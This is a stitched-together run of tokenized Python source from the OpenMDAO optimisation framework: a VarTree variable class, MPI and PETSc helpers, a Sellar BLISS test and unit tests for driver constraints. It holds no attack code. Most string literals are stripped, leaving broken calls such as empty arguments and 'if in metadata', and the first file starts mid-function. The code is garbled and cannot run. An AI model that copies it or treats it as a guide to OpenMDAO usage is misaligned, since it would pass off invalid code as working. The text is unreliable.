\n 
~~ if in name : \n 
~~~ cont . raise_exception ( "Can\'t create \'%s\' because it\'s a" \n 
" dotted pathname" % name , NameError ) \n 
\n 
~~ newtrait = cont . get_trait ( name ) \n 
if newtrait is not None : \n 
~~~ cont . raise_exception ( \n 
"Can\'t create \'%s\' because it already exists." % name , \n 
RuntimeError ) \n 
\n 
~~ if not cont . contains ( ref_name ) : \n 
~~~ cont . raise_exception ( "Can\'t create trait for \'%s\' because it wasn\'t" \n 
" found" % ref_name , AttributeError ) \n 
\n 
~~ cont . add_trait ( name , cont . build_trait ( ref_name , iostat , trait ) ) \n 
~~ ~~ """\nVariable meant to contain a VariableTree of a particular type.\n""" \n 
\n 
#public symbols \n 
__all__ = [ "VarTree" ] \n 
\n 
from traits . api import Instance \n 
\n 
from openmdao . main . variable import Variable , gui_excludes \n 
\n 
\n 
class VarTree ( Variable ) : \n 
~~~ """ A Variable for a :class:`VariableTree` of a particular type. """ \n 
\n 
def __init__ ( self , default_value , allow_none = True , ** metadata ) : \n 
~~~ from openmdao . main . vartree import VariableTree # Break import loop on VariableTree \n 
if isinstance ( default_value , VariableTree ) : \n 
~~~ klass = default_value . __class__ \n 
if in metadata : \n 
~~~ default_value . _iotype = metadata [ ] \n 
~~ else : \n 
~~~ metadata [ ] = default_value . iotype \n 
~~ ~~ else : \n 
~~~ raise TypeError ( \n 
) \n 
\n 
~~ metadata . setdefault ( , ) \n 
self . _allow_none = allow_none \n 
self . klass = klass \n 
self . _instance = Instance ( klass = klass , allow_none = False , factory = None , \n 
args = None , kw = None , ** metadata ) \n 
self . _instance . default_value = default_value \n 
super ( VarTree , self ) . __init__ ( default_value , ** metadata ) \n 
\n 
~~ def validate ( self , obj , name , value ) : \n 
~~~ """ Validates that a specified value is valid for this trait. """ \n 
if value is None : \n 
~~~ if self . _allow_none : \n 
~~~ return value \n 
~~ self . validate_failed ( obj , name , value ) \n 
\n 
~~ try : \n 
~~~ value = self . _instance . validate ( obj , name , value ) \n 
~~ except Exception : \n 
~~~ obj . raise_exception ( % \n 
( name , self . _instance . klass . __module__ , \n 
self . _instance . klass . __name__ , type ( value ) ) , \n 
TypeError ) \n 
~~ return value \n 
\n 
~~ def post_setattr ( self , obj , name , value ) : \n 
~~~ """ VariableTrees must know their place within the hierarchy, so set\n        their parent here.  This keeps side effects out of validate(). """ \n 
if value . parent is not obj : \n 
~~~ value . parent = obj \n 
value . name = name \n 
~~ value . _iotype = self . iotype \n 
\n 
~~ def get_attribute ( self , name , value , trait , meta ) : \n 
~~~ """Return the attribute dictionary for this variable. This dict is\n        used by the GUI to populate the edit UI. Slots also return an\n        attribute dictionary for the slot pane.\n\n        name: str\n          Name of variable\n\n        value: object\n          The value of the variable\n\n        trait: CTrait\n          The variable\'s trait\n\n        meta: dict\n          Dictionary of metadata for this variable\n        """ \n 
io_attr = { } \n 
io_attr [ ] = name \n 
io_attr [ ] = trait . trait_type . klass . __name__ \n 
io_attr [ ] = \n 
\n 
for field in meta : \n 
~~~ if field not in gui_excludes : \n 
~~~ io_attr [ field ] = meta [ field ] \n 
\n 
~~ ~~ return io_attr , None \n 
\n 
~~ ~~ import os \n 
import sys \n 
import numpy \n 
from contextlib import contextmanager \n 
\n 
# import ctypes \n 
# import io \n 
\n 
# libc = ctypes.CDLL(None) \n 
\n 
\n 
\n 
def _redirect_streams ( to_fd ) : \n 
~~~ """Redirect stdout/stderr to the given file descriptor.\n    Based on: http://eli.thegreenplace.net/2015/redirecting-all-kinds-of-stdout-in-python/\n    """ \n 
\n 
original_stdout_fd = sys . stdout . fileno ( ) \n 
original_stderr_fd = sys . stderr . fileno ( ) \n 
\n 
# # Flush the C-level buffers \n 
# libc.fflush(c_stdout) \n 
# libc.fflush(c_stderr) \n 
\n 
# Flush and close sys.stdout/err - also closes the file descriptors (fd) \n 
sys . stdout . close ( ) \n 
sys . stderr . close ( ) \n 
\n 
# Make original_stdout_fd point to the same file as to_fd \n 
os . dup2 ( to_fd , original_stdout_fd ) \n 
os . dup2 ( to_fd , original_stderr_fd ) \n 
\n 
# Create a new sys.stdout that points to the redirected fd \n 
\n 
sys . stdout = os . fdopen ( original_stdout_fd , , 0 ) # 0 makes them unbuffered \n 
sys . stderr = os . fdopen ( original_stderr_fd , , 0 ) \n 
\n 
# # Save a copy of the original stdout fd in saved_stdout_fd \n 
# saved_stdout_fd = os.dup(original_stdout_fd) \n 
\n 
~~ def use_proc_files ( ) : \n 
~~~ if MPI is not None : \n 
~~~ rank = MPI . COMM_WORLD . rank \n 
sname = "%s.out" % rank \n 
ofile = open ( sname , ) \n 
_redirect_streams ( ofile . fileno ( ) ) \n 
\n 
~~ ~~ def under_mpirun ( ) : \n 
~~~ """Return True if we\'re being executed under mpirun.""" \n 
# TODO: this is a bit of a hack and there appears to be \n 
# no consistent set of environment vars between MPI \n 
# implementations. \n 
for name in os . environ . keys ( ) : \n 
~~~ if name . startswith ( ) or name . startswith ( ) : \n 
~~~ return True \n 
~~ ~~ return False \n 
\n 
~~ class PETSc ( object ) : \n 
~~~ def __init__ ( self ) : \n 
~~~ self . needs_ksp = False \n 
self . _PETSc = None \n 
\n 
~~ @ property \n 
def installed ( self ) : \n 
~~~ try : \n 
~~~ if self . _PETSc is None : \n 
~~~ PETSc = _import_petsc ( ) \n 
del sys . modules [ ] \n 
self . _PETSc = PETSc \n 
~~ return True \n 
~~ except ImportError : \n 
~~~ self . _PETSc = None \n 
return False \n 
\n 
~~ ~~ def __getattr__ ( self , name ) : \n 
~~~ if self . installed : \n 
~~~ return getattr ( self . _PETSc , name ) \n 
~~ raise AttributeError ( name ) \n 
\n 
~~ ~~ def create_petsc_vec ( comm , arr ) : \n 
~~~ if under_mpirun ( ) or PETSc . needs_ksp : \n 
~~~ if PETSc . installed and ( MPI is None or comm != MPI . COMM_NULL ) : \n 
~~~ return PETSc . Vec ( ) . createWithArray ( arr , comm = comm ) \n 
\n 
~~ ~~ return None \n 
\n 
~~ def _import_petsc ( ) : \n 
~~~ import petsc4py \n 
\n 
from petsc4py import PETSc \n 
return PETSc \n 
\n 
~~ if under_mpirun ( ) : \n 
~~~ from mpi4py import MPI \n 
PETSc = _import_petsc ( ) \n 
PETSc . installed = True \n 
\n 
COMM_NULL = MPI . COMM_NULL \n 
\n 
~~ else : \n 
~~~ MPI = None \n 
COMM_NULL = None \n 
PETSc = PETSc ( ) \n 
\n 
\n 
~~ class MPI_info ( object ) : \n 
~~~ def __init__ ( self ) : \n 
# min/max requested cpus \n 
~~~ self . requested_cpus = ( 1 , 1 ) \n 
\n 
# the MPI communicator used by this comp and its children \n 
self . comm = COMM_NULL \n 
\n 
~~ @ property \n 
def size ( self ) : \n 
~~~ if MPI and self . comm != COMM_NULL : \n 
~~~ return self . comm . size \n 
~~ return 1 \n 
\n 
~~ @ property \n 
def rank ( self ) : \n 
~~~ if MPI : \n 
~~~ if self . comm != COMM_NULL : \n 
~~~ return self . comm . rank \n 
~~ else : \n 
~~~ return - 1 \n 
~~ ~~ return 0 \n 
\n 
\n 
~~ ~~ def get_norm ( vec , order = None ) : \n 
~~~ """Either do a distributed norm or a local numpy\n    norm depending on whether we\'re running under MPI.\n\n    vec: VecWrapper\n        Returns the norm of this vector\n\n    order: int, float, string (see numpy.linalg.norm)\n        Order of the norm (ignored in MPI)\n    """ \n 
\n 
if MPI : \n 
~~~ vec . petsc_vec . assemble ( ) \n 
return vec . petsc_vec . norm ( ) \n 
~~ else : \n 
~~~ return numpy . linalg . norm ( vec . array , ord = order ) \n 
\n 
# dtype needed for index arrays \n 
~~ ~~ idx_arr_type = PETSc . IntType if MPI else \n 
\n 
def make_idx_array ( start , end ) : \n 
~~~ """ Return an index vector of the right int type for\n    parallel or serial computation.\n    """ \n 
return numpy . arange ( start , end , dtype = idx_arr_type ) \n 
\n 
~~ def to_idx_array ( idxs ) : \n 
~~~ """ Return an index vector of the right int type for\n    parallel or serial computation.\n    """ \n 
return numpy . array ( idxs , dtype = idx_arr_type ) \n 
\n 
~~ def evenly_distrib_idxs ( num_divisions , arr_size ) : \n 
~~~ """Given a number of divisions and the size of an array, chop the array up\n    into pieces according to number of divisions, keeping the distribution\n    of entries as even as possible. Returns a tuple of\n    (sizes, offsets), where sizes and offsets contain values for all\n    divisions.\n    """ \n 
base = arr_size / num_divisions \n 
leftover = arr_size % num_divisions \n 
sizes = numpy . ones ( num_divisions , dtype = "int" ) * base \n 
\n 
# evenly distribute the remainder across size-leftover procs, \n 
# instead of giving the whole remainder to one proc \n 
sizes [ : leftover ] += 1 \n 
\n 
offsets = numpy . zeros ( num_divisions , dtype = "int" ) \n 
offsets [ 1 : ] = numpy . cumsum ( sizes ) [ : - 1 ] \n 
\n 
return sizes , offsets \n 
\n 
\n 
~~ @ contextmanager \n 
def MPIContext ( ) : \n 
~~~ """Wrap this around code that you want to globally fail if it fails\n    on any MPI process in MPI_WORLD.\n    """ \n 
try : \n 
~~~ yield \n 
~~ except : \n 
~~~ exc_type , exc_val , exc_tb = sys . exc_info ( ) \n 
if exc_val is not None : \n 
~~~ fail = True \n 
~~ else : \n 
~~~ fail = False \n 
\n 
~~ fails = MPI . COMM_WORLD . allgather ( fail ) \n 
\n 
if fail or not any ( fails ) : \n 
~~~ raise exc_type , exc_val , exc_tb \n 
~~ else : \n 
~~~ for i , f in enumerate ( fails ) : \n 
~~~ if f : \n 
~~~ raise RuntimeError ( "a test failed in (at least) rank %d" % i ) \n 
\n 
\n 
\n 
~~ ~~ ~~ ~~ ~~ if os . environ . get ( ) : \n 
~~~ use_proc_files ( ) \n 
~~ import unittest \n 
\n 
from openmdao . main . api import Assembly , Component \n 
from openmdao . main . datatypes . api import Float , Array \n 
from openmdao . lib . drivers . api import CONMINdriver , BroydenSolver , SensitivityDriver , FixedPointIterator \n 
\n 
from openmdao . lib . optproblems import sellar \n 
\n 
\n 
\n 
class Dis12Linear ( Component ) : \n 
~~~ """ Linear model of one a sellar model or system. """ \n 
\n 
z1 = Float ( 0. , iotype = ) \n 
z2 = Float ( 0. , iotype = ) \n 
z_store = Array ( [ 0. , 0. ] , iotype = ) \n 
\n 
ssa_F = Array ( [ 0.0 ] , iotype = ) \n 
ssa_G = Array ( [ 0.0 , 0.0 ] , iotype = ) \n 
ssa_dF = Array ( [ 0.0 , 0.0 ] , iotype = ) \n 
ssa_dG = Array ( [ [ 0.0 , 0.0 ] , [ 0.0 , 0.0 ] ] , iotype = ) \n 
\n 
obj = Float ( 0.0 , iotype = ) \n 
con1 = Float ( 0.0 , iotype = ) \n 
con2 = Float ( 0.0 , iotype = ) \n 
\n 
def execute ( self ) : \n 
\n 
~~~ self . obj = self . ssa_F [ 0 ] + self . ssa_dF [ 0 ] * ( self . z_store [ 0 ] - self . z1 ) + self . ssa_dF [ 1 ] * ( self . z_store [ 1 ] - self . z2 ) \n 
self . con1 = self . ssa_G [ 0 ] + self . ssa_dG [ 0 ] [ 0 ] * ( self . z_store [ 0 ] - self . z1 ) + self . ssa_dG [ 0 ] [ 1 ] * ( self . z_store [ 1 ] - self . z2 ) \n 
self . con2 = self . ssa_G [ 1 ] + self . ssa_dG [ 1 ] [ 0 ] * ( self . z_store [ 0 ] - self . z1 ) + self . ssa_dG [ 1 ] [ 1 ] * ( self . z_store [ 1 ] - self . z2 ) \n 
\n 
\n 
~~ ~~ class SellarBLISS ( Assembly ) : \n 
\n 
~~~ z_store = Array ( [ 0. , 0. ] , dtype = Float , iotype = ) \n 
\n 
def configure ( self ) : \n 
~~~ """ Creates a new Assembly with this problem\n\n        Optimal Design at (1.9776, 0, 0)\n\n        Optimal Objective = 3.18339""" \n 
\n 
# Disciplines \n 
self . add ( , Dis12Linear ( ) ) \n 
self . connect ( , ) \n 
\n 
# Global Optimization \n 
self . add ( , CONMINdriver ( ) ) \n 
self . sysopt . add_parameter ( , low = - 10.0 , high = 10.0 , start = 5.0 ) \n 
self . sysopt . add_objective ( ) \n 
\n 
self . driver . workflow . add ( [ ] ) \n 
self . sysopt . workflow . add ( [ ] ) \n 
\n 
\n 
\n 
\n 
~~ ~~ class BndryFullSubTestCase ( unittest . TestCase ) : \n 
\n 
~~~ def test_MDF ( self ) : \n 
~~~ prob = SellarBLISS ( ) \n 
prob . name = \n 
prob . run ( ) \n 
\n 
#assert_rel_error(self, 31., top.sens.dF, 0.00001) \n 
#assert_rel_error(self, 31., top.down.y, 0.00001) \n 
\n 
\n 
~~ ~~ if __name__ == : \n 
~~~ unittest . main ( ) # pylint: disable-msg=C0111,C0103 \n 
\n 
~~ import numpy as np \n 
\n 
import unittest \n 
\n 
from openmdao . main . api import Assembly , Component , Driver , set_as_top \n 
from openmdao . main . datatypes . api import Float , Array \n 
from openmdao . main . hasconstraints import HasConstraints , HasEqConstraints , HasIneqConstraints , Constraint , Has2SidedConstraints \n 
from openmdao . main . interfaces import IHas2SidedConstraints , implements \n 
from openmdao . main . pseudocomp import SimpleEQConPComp , SimpleEQ0PComp \n 
from openmdao . main . test . simpledriver import SimpleDriver \n 
from openmdao . test . execcomp import ExecComp \n 
from openmdao . units . units import PhysicalQuantity \n 
from openmdao . util . decorators import add_delegate \n 
from openmdao . util . testutil import assert_rel_error \n 
\n 
@ add_delegate ( HasConstraints ) \n 
class MyDriver ( Driver ) : \n 
~~~ pass \n 
\n 
~~ @ add_delegate ( HasEqConstraints ) \n 
class MyEqDriver ( Driver ) : \n 
~~~ pass \n 
\n 
~~ @ add_delegate ( HasIneqConstraints ) \n 
class MyInEqDriver ( Driver ) : \n 
~~~ pass \n 
\n 
~~ @ add_delegate ( HasConstraints , Has2SidedConstraints ) \n 
class My2SDriver ( Driver ) : \n 
\n 
~~~ implements ( IHas2SidedConstraints ) \n 
\n 
~~ class SimpleUnits ( Component ) : \n 
~~~ a = Float ( iotype = , units = ) \n 
b = Float ( iotype = , units = ) \n 
c = Float ( iotype = , units = ) \n 
d = Float ( iotype = , units = ) \n 
arr = Array ( [ 1. , 2. , 3. ] , iotype = , units = ) \n 
arr_out = Array ( [ 1. , 2. , 3. ] , iotype = , units = ) \n 
\n 
def __init__ ( self ) : \n 
~~~ super ( SimpleUnits , self ) . __init__ ( ) \n 
self . a = 1 \n 
self . b = 2 \n 
self . c = 3 \n 
self . d = - 1 \n 
\n 
~~ def execute ( self ) : \n 
~~~ self . c = PhysicalQuantity ( self . a + self . b , ) . in_units_of ( ) . value \n 
self . d = PhysicalQuantity ( self . a - self . b , ) . in_units_of ( ) . value \n 
\n 
~~ ~~ class Simple ( Component ) : \n 
~~~ a = Float ( iotype = ) \n 
b = Float ( iotype = ) \n 
c = Float ( iotype = ) \n 
d = Float ( iotype = ) \n 
\n 
def __init__ ( self ) : \n 
~~~ super ( Simple , self ) . __init__ ( ) \n 
self . a = 1 \n 
self . b = 2 \n 
self . c = 3 \n 
self . d = - 1 \n 
\n 
~~ def execute ( self ) : \n 
~~~ self . c = self . a + self . b \n 
self . d = self . a - self . b \n 
\n 
~~ def list_deriv_vars ( self ) : \n 
~~~ return ( , ) , ( , ) \n 
\n 
~~ def provideJ ( self ) : \n 
~~~ der = 1.0 \n 
return np . array ( [ [ der , der ] , [ der , der ] ] ) \n 
\n 
\n 
~~ ~~ class HasConstraintsTestCase ( unittest . TestCase ) : \n 
\n 
~~~ def setUp ( self ) : \n 
~~~ self . asm = set_as_top ( Assembly ( ) ) \n 
self . asm . add ( , Simple ( ) ) \n 
self . asm . add ( , Simple ( ) ) \n 
self . asm . add ( , SimpleUnits ( ) ) \n 
self . asm . add ( , SimpleUnits ( ) ) \n 
\n 
~~ def test_list_constraints ( self ) : \n 
~~~ drv = self . asm . add ( , MyDriver ( ) ) \n 
self . asm . run ( ) \n 
drv . add_constraint ( ) \n 
drv . add_constraint ( ) \n 
self . assertEqual ( drv . list_constraints ( ) , \n 
[ , ] ) \n 
\n 
~~ def test_list_eq_constraints ( self ) : \n 
~~~ drv = self . asm . add ( , MyEqDriver ( ) ) \n 
drv . add_constraint ( ) \n 
drv . add_constraint ( ) \n 
self . assertEqual ( drv . list_constraints ( ) , \n 
[ , ] ) \n 
\n 
~~ def test_list_ineq_constraints ( self ) : \n 
~~~ drv = self . asm . add ( , MyDriver ( ) ) \n 
drv . add_constraint ( ) \n 
drv . add_constraint ( ) \n 
self . assertEqual ( drv . list_constraints ( ) , \n 
[ , ] ) \n 
\n 
~~ def _check_ineq_add_constraint ( self , drv ) : \n 
~~~ self . asm . add ( , drv ) \n 
\n 
try : \n 
~~~ drv . add_constraint ( ) \n 
~~ except Exception as err : \n 
~~~ self . assertEqual ( str ( err ) , "driver: Constraints require an explicit comparator (=, <, >, <=, or >=)" ~~ else : \n 
~~~ self . fail ( "Exception expected" ) \n 
\n 
~~ self . assertEqual ( len ( drv . get_ineq_constraints ( ) ) , 0 ) \n 
drv . add_constraint ( ) \n 
\n 
try : \n 
~~~ drv . add_constraint ( ) \n 
~~ except Exception as err : \n 
~~~ self . assertEqual ( str ( err ) , \n 
\'driver: A constraint of the form "comp1.a>comp1.b" already exists \' \n 
) \n 
~~ else : \n 
~~~ self . fail ( "Exception Expected" ) \n 
\n 
~~ self . assertEqual ( len ( drv . get_ineq_constraints ( ) ) , 1 ) \n 
drv . remove_constraint ( ) \n 
self . assertEqual ( len ( drv . get_ineq_constraints ( ) ) , 0 ) \n 
try : \n 
~~~ drv . remove_constraint ( ) \n 
~~ except Exception as err : \n 
~~~ self . assertEqual ( str ( err ) , \n 
"driver: Constraint \'comp1.bogus<comp1.d\' was not found. Remove failed." ) \n 
~~ else : \n 
~~~ self . fail ( "Exception expected" ) \n 
~~ drv . add_constraint ( ) \n 
self . assertEqual ( len ( drv . get_ineq_constraints ( ) ) , 1 ) \n 
\n 
drv . add_constraint ( , name = ) \n 
self . assertEqual ( len ( drv . get_ineq_constraints ( ) ) , 2 ) \n 
\n 
try : \n 
~~~ drv . add_constraint ( , name = ) \n 
~~ except Exception as err : \n 
~~~ self . assertEqual ( str ( err ) , \'driver: A constraint named "foobar" already exists in the driver. Add failed.\' ~~ else : \n 
~~~ self . fail ( "Exception expected" ) \n 
\n 
~~ self . assertEqual ( len ( drv . get_ineq_constraints ( ) ) , 2 ) \n 
\n 
drv . remove_constraint ( ) \n 
self . assertEqual ( len ( drv . get_ineq_constraints ( ) ) , 1 ) \n 
\n 
drv . clear_constraints ( ) \n 
\n 
self . assertEqual ( len ( drv . get_ineq_constraints ( ) ) , 0 ) \n 
\n 
try : \n 
~~~ drv . add_constraint ( ) \n 
~~ except ValueError as err : \n 
~~~ self . assertEqual ( str ( err ) , \n 
"Right hand side of constraint \'comp1.b < comp1.qq\' has invalid variables \'comp1.qq\'" ~~ else : \n 
~~~ self . fail ( ) \n 
\n 
~~ ~~ def _check_eq_add_constraint ( self , drv ) : \n 
~~~ self . asm . add ( , drv ) \n 
\n 
self . assertEqual ( len ( drv . get_eq_constraints ( ) ) , 0 ) \n 
self . assertEqual ( len ( drv . get_eq_constraints ( ) ) , 0 ) \n 
drv . add_constraint ( ) \n 
self . assertEqual ( len ( drv . get_eq_constraints ( ) ) , 1 ) \n 
\n 
try : \n 
~~~ drv . add_constraint ( ) \n 
~~ except Exception as err : \n 
~~~ self . assertEqual ( str ( err ) , \n 
\'driver: A constraint of the form "comp1.c=comp1.d" already exists \' \n 
) \n 
~~ else : \n 
~~~ self . fail ( "Exception Expected" ) \n 
\n 
~~ drv . remove_constraint ( ) \n 
self . assertEqual ( len ( drv . get_eq_constraints ( ) ) , 0 ) \n 
try : \n 
~~~ drv . remove_constraint ( ) \n 
~~ except Exception as err : \n 
~~~ self . assertEqual ( str ( err ) , \n 
"driver: Constraint \'comp1.bogus=comp1.d\' was not found. Remove failed." ) \n 
~~ else : \n 
~~~ self . fail ( "Exception expected" ) \n 
~~ self . assertEqual ( len ( drv . get_eq_constraints ( ) ) , 0 ) \n 
\n 
drv . add_constraint ( ) \n 
self . assertEqual ( len ( drv . get_eq_constraints ( ) ) , 1 ) \n 
\n 
drv . add_constraint ( , name = ) \n 
self . assertEqual ( len ( drv . get_eq_constraints ( ) ) , 2 ) \n 
\n 
try : \n 
~~~ drv . add_constraint ( , name = ) \n 
~~ except Exception as err : \n 
~~~ self . assertEqual ( str ( err ) , \'driver: A constraint named "foobar" already exists in the driver. Add failed.\' ~~ else : \n 
~~~ self . fail ( "Exception expected" ) \n 
\n 
~~ drv . remove_constraint ( ) \n 
self . assertEqual ( len ( drv . get_eq_constraints ( ) ) , 1 ) \n 
\n 
drv . clear_constraints ( ) \n 
\n 
self . assertEqual ( len ( drv . get_eq_constraints ( ) ) , 0 ) \n 
try : \n 
~~~ drv . add_constraint ( ) \n 
~~ except ValueError as err : \n 
~~~ self . assertEqual ( str ( err ) , \n 
"Left hand side of constraint \'comp1.qq = comp1.b\' has invalid variables \'comp1.qq\'" ) ~~ else : \n 
~~~ self . fail ( ) \n 
\n 
~~ ~~ def _check_eq_eval_constraints ( self , drv ) : \n 
~~~ self . asm . add ( , drv ) \n 
\n 
vals = drv . eval_eq_constraints ( ) \n 
self . assertEqual ( len ( vals ) , 0 ) \n 
drv . add_constraint ( ) \n 
\n 
self . asm . comp1 . a = 4 \n 
self . asm . comp1 . b = 5 \n 
self . asm . comp1 . c = 9 \n 
self . asm . comp1 . d = - 1 \n 
\n 
self . asm . run ( ) \n 
vals = drv . eval_eq_constraints ( ) \n 
self . assertEqual ( len ( vals ) , 1 ) \n 
self . assertEqual ( vals [ 0 ] , 10. ) \n 
\n 
vals = drv . get_eq_constraints ( ) \n 
self . assertEqual ( len ( vals ) , 1 ) \n 
self . assertTrue ( isinstance ( vals [ ] , Constraint ) ) \n 
\n 
~~ def _check_ineq_eval_constraints ( self , drv ) : \n 
~~~ self . asm . add ( , drv ) \n 
\n 
vals = drv . eval_ineq_constraints ( ) \n 
self . assertEqual ( len ( vals ) , 0 ) \n 
\n 
drv . add_constraint ( ) \n 
\n 
self . asm . comp1 . a = 4 \n 
self . asm . comp1 . b = 5 \n 
self . asm . comp1 . c = 9 \n 
self . asm . comp1 . d = - 1 \n 
\n 
self . asm . run ( ) \n 
vals = drv . eval_ineq_constraints ( ) \n 
self . assertEqual ( len ( vals ) , 1 ) \n 
self . assertEqual ( vals [ 0 ] , 1 ) \n 
\n 
vals = drv . get_ineq_constraints ( ) \n 
self . assertEqual ( len ( vals ) , 1 ) \n 
self . assertTrue ( isinstance ( vals [ ] , Constraint ) ) \n 
\n 
~~ def test_constraint_scaler_adder ( self ) : \n 
~~~ drv = self . asm . add ( , MyDriver ( ) ) \n 
self . asm . comp1 . a = 3000 \n 
self . asm . comp1 . b = 5000 \n 
drv . add_constraint ( ) \n 
self . asm . run ( ) \n 
result = drv . eval_ineq_constraints ( ) \n 
\n 
self . assertEqual ( result [ 0 ] , - 5001.0 ) \n 
\n 
drv . remove_constraint ( ) #cant add constraints that are already there result = drv . eval_ineq_constraints ( ) \n 
self . assertEqual ( result , [ ] ) \n 
\n 
#try: \n 
\n 
#except ValueError as err: \n 
#self.assertEqual(str(err), \n 
#"Scaler parameter should be a float > 0") \n 
#else: \n 
\n 
\n 
#try: \n 
\n 
#except ValueError as err: \n 
#self.assertEqual(str(err), \n 
#"Scaler parameter should be a float") \n 
#else: \n 
\n 
\n 
#try: \n 
\n 
#except ValueError as err: \n 
#self.assertEqual(str(err), \n 
#"Adder parameter should be a float") \n 
#else: \n 
\n 
\n 
~~ def test_add_constraint_eq_eq ( self ) : \n 
~~~ drv = MyDriver ( ) \n 
self . asm . add ( , drv ) \n 
try : \n 
~~~ drv . add_constraint ( ) \n 
~~ except Exception as err : \n 
~~~ self . assertEqual ( str ( err ) , "driver: Constraints require an explicit comparator (=, <, >, <=, or >=)" ~~ else : \n 
~~~ self . fail ( "Exception expected" ) \n 
\n 
~~ ~~ def test_add_constraint ( self ) : \n 
~~~ drv = MyDriver ( ) \n 
self . _check_eq_add_constraint ( drv ) \n 
self . _check_ineq_add_constraint ( drv ) \n 
\n 
~~ def test_add_eq_constraint ( self ) : \n 
~~~ self . _check_eq_add_constraint ( MyEqDriver ( ) ) \n 
\n 
~~ def test_add_ineq_constraint ( self ) : \n 
~~~ self . _check_ineq_add_constraint ( MyInEqDriver ( ) ) \n 
\n 
~~ def test_implicit_constraint ( self ) : \n 
~~~ drv = self . asm . add ( , MyEqDriver ( ) ) \n 
try : \n 
~~~ drv . add_constraint ( ) \n 
~~ except ValueError , err : \n 
~~~ self . assertEqual ( str ( err ) , \n 
"driver: Constraints require an explicit comparator (=, <, >, <=, or >=)" ~~ else : \n 
~~~ self . fail ( ) \n 
\n 
~~ ~~ def test_eval_constraint ( self ) : \n 
~~~ self . _check_eq_eval_constraints ( MyDriver ( ) ) \n 
self . _check_ineq_eval_constraints ( MyDriver ( ) ) \n 
\n 
~~ def test_eval_eq_constraint ( self ) : \n 
~~~ self . _check_eq_eval_constraints ( MyEqDriver ( ) ) \n 
\n 
~~ def test_eval_ineq_constraint ( self ) : \n 
~~~ self . _check_ineq_eval_constraints ( MyInEqDriver ( ) ) \n 
\n 
~~ def test_pseudocomps ( self ) : \n 
~~~ self . asm . add ( , MyDriver ( ) ) \n 
self . asm . driver . workflow . add ( [ , ] ) \n 
self . asm . _setup ( ) \n 
self . assertEqual ( self . asm . _depgraph . list_connections ( ) , \n 
[ ] ) \n 
self . asm . driver . add_constraint ( ) \n 
self . asm . _setup ( ) \n 
self . assertEqual ( self . asm . _pseudo_0 . _orig_expr , ) \n 
self . assertEqual ( set ( self . asm . _depgraph . list_connections ( drivers = False ) ) , \n 
set ( [ ( , ) , ( , ) ] ) ) \n 
\n 
self . asm . driver . remove_constraint ( ) \n 
self . asm . _setup ( ) \n 
self . assertEqual ( self . asm . _depgraph . list_connections ( drivers = False ) , [ ] ) \n 
\n 
self . asm . driver . add_constraint ( ) \n 
self . asm . _setup ( ) \n 
self . assertEqual ( set ( self . asm . _depgraph . list_connections ( drivers = False ) ) , \n 
set ( [ ( , ) ] ) ) \n 
\n 
self . asm . _setup ( ) \n 
self . assertEqual ( self . asm . _pseudo_1 . _orig_expr , ) \n 
\n 
self . asm . driver . add_constraint ( ) \n 
self . asm . _setup ( ) \n 
self . assertEqual ( self . asm . _pseudo_2 . _orig_expr , ) \n 
\n 
self . asm . driver . add_constraint ( ) \n 
self . asm . _setup ( ) \n 
self . assertEqual ( self . asm . _pseudo_3 . _orig_expr , ) \n 
\n 
\n 
self . asm . driver . add_constraint ( ) \n 
self . asm . _setup ( ) \n 
self . assertEqual ( self . asm . _pseudo_4 . _orig_expr , ) \n 
\n 
self . asm . driver . clear_constraints ( ) \n 
\n 
self . asm . comp1 . a = 2 \n 
self . asm . comp1 . b = 1 \n 
self . asm . comp2 . a = 4 \n 
self . asm . comp2 . b = 2 \n 
\n 
# comp1.c = 3 \n 
# comp1.d = 1 \n 
# comp2.c = 6 \n 
# comp2.d = 2 \n 
self . asm . driver . add_constraint ( ) \n 
self . asm . driver . add_constraint ( ) \n 
self . asm . driver . add_constraint ( ) \n 
\n 
self . asm . run ( ) \n 
\n 
self . assertEqual ( self . asm . _pseudo_5 . out0 , 1.0 ) \n 
self . assertEqual ( self . asm . _pseudo_6 . out0 , - 1.0 ) \n 
self . assertEqual ( self . asm . _pseudo_7 . out0 , 2.0 ) \n 
\n 
~~ def test_custom_pseudocomp_creation ( self ) : \n 
~~~ self . asm . add ( , MyDriver ( ) ) \n 
arg = { } \n 
result = { } \n 
\n 
self . asm . driver . add_constraint ( ) \n 
self . asm . _setup ( ) \n 
self . assertEqual ( self . asm . _pseudo_0 . __class__ , SimpleEQ0PComp ) \n 
self . asm . run ( ) \n 
arg [ ] = np . array ( [ 3.3 ] ) \n 
result [ ] = np . array ( [ 0.0 ] ) \n 
self . asm . _pseudo_0 . apply_deriv ( arg , result ) \n 
self . assertEqual ( result [ ] [ 0 ] , 3.3 ) \n 
\n 
self . asm . driver . add_constraint ( ) \n 
self . asm . _setup ( ) \n 
self . assertEqual ( self . asm . _pseudo_1 . __class__ , SimpleEQ0PComp ) \n 
self . asm . run ( ) \n 
arg [ ] = np . array ( [ 3.3 ] ) \n 
result [ ] = np . array ( [ 0.0 ] ) \n 
self . asm . _pseudo_1 . apply_deriv ( arg , result ) \n 
self . assertEqual ( result [ ] [ 0 ] , 3.3 ) \n 
\n 
self . asm . driver . add_constraint ( ) \n 
self . asm . _setup ( ) \n 
self . assertEqual ( self . asm . _pseudo_2 . __class__ , SimpleEQConPComp ) \n 
self . asm . run ( ) \n 
arg [ ] = np . array ( [ 7.2 ] ) \n 
arg [ ] = np . array ( [ 3.1 ] ) \n 
result [ ] = np . array ( [ 0.0 ] ) \n 
self . asm . _pseudo_2 . apply_deriv ( arg , result ) \n 
self . assertEqual ( result [ ] [ 0 ] , 4.1 ) \n 
\n 
self . asm . driver . clear_constraints ( ) \n 
self . asm . driver . add_constraint ( ) \n 
self . asm . _setup ( ) \n 
self . assertEqual ( self . asm . _pseudo_3 . __class__ , SimpleEQConPComp ) \n 
self . asm . run ( ) \n 
arg [ ] = np . array ( [ 7.2 ] ) \n 
arg [ ] = np . array ( [ 3.1 ] ) \n 
result [ ] = np . array ( [ 0.0 ] ) \n 
self . asm . _pseudo_3 . apply_deriv ( arg , result ) \n 
self . assertEqual ( result [ ] [ 0 ] , 4.1 ) \n 
\n 
self . asm . driver . clear_constraints ( ) \n 
self . asm . driver . add_constraint ( ) \n 
self . asm . _setup ( ) \n 
self . assertEqual ( self . asm . _pseudo_4 . __class__ , SimpleEQConPComp ) \n 
self . asm . run ( ) \n 
arg [ ] = np . array ( [ 7.2 ] ) \n 
arg [ ] = np . array ( [ 3.1 ] ) \n 
result [ ] = np . array ( [ 0.0 ] ) \n 
self . asm . _pseudo_4 . apply_deriv ( arg , result ) \n 
